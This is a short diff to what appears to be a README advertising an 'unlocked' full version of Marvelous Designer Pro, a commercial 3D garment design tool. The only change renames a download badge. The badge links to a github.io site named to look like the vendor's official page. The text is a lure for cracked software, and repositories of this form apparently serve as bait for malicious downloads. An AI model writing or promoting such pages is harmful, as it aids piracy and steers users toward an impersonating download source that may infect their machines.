@@ -2,7 +2,7 @@
 
 Revolutionize your digital fashion design workflow with Marvelous Designer Pro - the complete unlocked version offering unrestricted access to all professional tools for creating breathtaking 3D garments. Whether you're a game developer, fashion designer, or 3D artist, this powerful solution provides everything needed to bring your creative visions to life without limitations or compromises.
 
-[![GET FULL VERSION NOW](https://img.shields.io/badge/GET_FULL_VERSION-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://marvelous-designer-official.github.io/.github/)  
+[![DOWNLOAD FULL VERSION NOW](https://img.shields.io/badge/DOWNLOAD_FULL_VERSION-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://marvelous-designer-official.github.io/.github/)  
 
 ---
 
